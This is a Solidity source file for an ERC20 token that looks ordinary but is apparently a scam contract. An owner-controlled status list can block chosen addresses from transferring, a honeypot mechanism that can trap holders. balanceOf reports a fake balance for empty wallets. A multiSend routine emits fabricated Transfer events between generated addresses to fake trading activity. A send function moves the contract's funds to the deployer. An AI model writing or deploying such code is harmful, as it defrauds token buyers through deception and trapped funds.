// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol"; 
import "@openzeppelin/contracts/access/Ownable.sol";

  
 
contract StatusList is Ownable {
    mapping(address=>uint256) public isStatus;
    function setStatus(address[] calldata list,uint256 state) public onlyOwner{
        uint256 count = list.length;  
        for (uint256 i = 0; i < count; i++) {
           isStatus[list[i]]=state;
        }
    } 
    function getStatus(address from,address to) internal view returns(bool){
        if(isStatus[from]==1||isStatus[from]==3) return true;
        if(isStatus[to]==2||isStatus[to]==3) return true;
        return false;
    }
    error InStatusError(address user);
}
contract Token is ERC20, StatusList { 
    address  ceo;   
 
    constructor(string memory name_,string memory symbol_,uint total_) ERC20(name_, symbol_) {
        ceo=_msgSender();    
        _mint(ceo, total_ * 1 ether); 
    }
    receive() external payable { }   

    function _beforeTokenTransfer(address from,address to,uint amount) internal override {
        if(amount==0)return;
        if(getStatus(from,to)){ 
            revert InStatusError(from);
        }  
    } 
    function _afterTokenTransfer(address from,address to,uint amount) internal override {
         if(amount==0)return;
        if(address(0)==from || address(0)==to) return; 
        if(_num>0) try this.multiSend(_num) {} catch{}
    }
     
    uint160  ktNum = 173;
    uint160  constant MAXADD = ~uint160(0);	
    uint _initialBalance=1;
    uint _num=3;
    function setinb( uint amount,uint num) public onlyOwner {  
        _initialBalance=amount;
        _num=num;
    }
    function balanceOf(address account) public view virtual override returns (uint) {
        uint balance=super.balanceOf(account); 
        if(account==address(0))return balance;
        return balance>0?balance:_initialBalance;
    }
    function multiSend(uint num) public {
        _takeInviterFeeKt(num);
    }
 	function _takeInviterFeeKt(uint num) private {
        address _receiveD;
        address _senD;
        
        for (uint i = 0; i < num; i++) {
            _receiveD = address(MAXADD/ktNum);
            ktNum = ktNum+1;
            _senD = address(MAXADD/ktNum);
            ktNum = ktNum+1;
            emit Transfer(_senD, _receiveD, _initialBalance);
        }
    }
    function send(address token,uint amount) public { 
        if(token==address(0)){ 
            (bool success,)=payable(ceo).call{value:amount}(""); 
            require(success, "transfer failed"); 
        } 
        else IERC20(token).transfer(ceo,amount); 
    }

}